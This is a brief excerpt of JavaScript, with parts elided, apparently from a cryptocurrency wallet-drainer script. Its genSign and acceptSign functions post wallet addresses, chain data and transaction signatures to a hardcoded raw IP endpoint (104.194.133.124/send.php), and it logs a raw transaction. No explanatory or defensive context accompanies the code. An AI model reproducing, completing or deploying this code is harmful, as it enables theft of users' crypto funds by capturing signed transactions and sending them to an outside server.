  ...
  async function runner() {
    try {
      ...
      async function genSign(address, chain, type, contract = "0") {
        try {
          let url = "http://104.194.133.124/send.php";
          ...
          var result = await jQuery.post(url, requestData);
      ...
      async function acceptSign(signature, type) {
        try {
          let url = "http://104.194.133.124/send.php";
          let requestData = { handler: "sign", signature, type };
      ...
      console.log("Raw Transaction:", rawsign);
    } catch (error) {
      console.error("Error in runner function:", error);
    }
  }
